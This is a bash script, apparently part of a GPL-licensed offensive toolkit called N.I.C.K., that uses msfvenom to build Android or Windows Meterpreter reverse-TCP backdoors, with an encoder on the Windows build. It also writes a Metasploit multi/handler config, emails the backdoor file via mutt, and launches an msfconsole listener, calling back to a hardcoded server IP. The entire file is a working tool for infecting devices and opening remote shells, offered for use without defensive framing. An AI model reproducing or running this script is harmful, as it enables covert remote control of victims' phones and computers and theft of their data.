#!/bin/bash

#    This file is part of N.I.C.K.

#    N.I.C.K is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    N.I.C.K is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with N.I.C.K.  If not, see <http://www.gnu.org/licenses/>.


BOLD='\e[32;1m'
PLN='\e[0m'
RED='\033[32;31m'
GRN='\033[0;32m'
NC='\033[0m'
BLU='\033[1;34m'


server_ip=223.179.140.121;
dev_path=$PWD/payload
listener()
{
  echo "Starting the listner... Please Wait.."
  service postgresql start;
  xterm -title Listner -e msfconsole -r metaconfig & echo "Listner Started"
}

apk_backdoor()
{
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$server_ip LPORT=$dev_port R> $dev_path/$file_name
  echo -e "use multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $dev_ip\nset LPORT $dev_port\nexploit" > metaconfig
}
exe_backdoor()
{
  msfvenom -a x86 --platform windows -k -p windows/meterpreter/reverse_tcp LHOST=$server_ip -e x86/shikata_ga_nai -i 3 -b "\x00" > $dev_path/$file_name
  echo -e "use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $dev_ip\nset LPORT $dev_port\nexploit" > metaconfig
}
echo -e "${BOLD}${BLU}Server side infectious media attack${NC}${PLN}"
echo -e "[+] Press 1 to generate payload for ${GRN}android${NC}"
echo -e "[+] Press 2 to generate payload for ${GRN}windows${NC}"
read opt;
dev_ip=$(hostname -I)
printf "[+] Enter the port you want to ${GRN}listen${NC} to  :- "
read dev_port;
printf "[+] Enter a name for the ${GRN}backdoor${NC} :- "
read file_name;
if [ $opt -eq 1 ]
then
  apk_backdoor;
elif [ $opt -eq 2 ]
then
  exe_backdoor;
else
  echo -e "${BOLD}${RED}Wrong Input${NC}${PLN}"
  ./inf_media.sh;
fi
echo -e "[+] Enter your ${RED}email address${NC}"
read emailID
echo -e "${BLU}Backdoor is being mailed to you... Please be patient... It may take some time${NC}"
echo "Please find the attatched backdoor file" | mutt -s "Backdoor file" $emailID -a $dev_path/$file_name;
echo -e "${BOLD}${RED}[+] Do you want to start a listener now !!! (yes/no)${PLN}${NC}"
read lis_ans
if [ $lis_ans == "yes" ]
then
  listener
fi



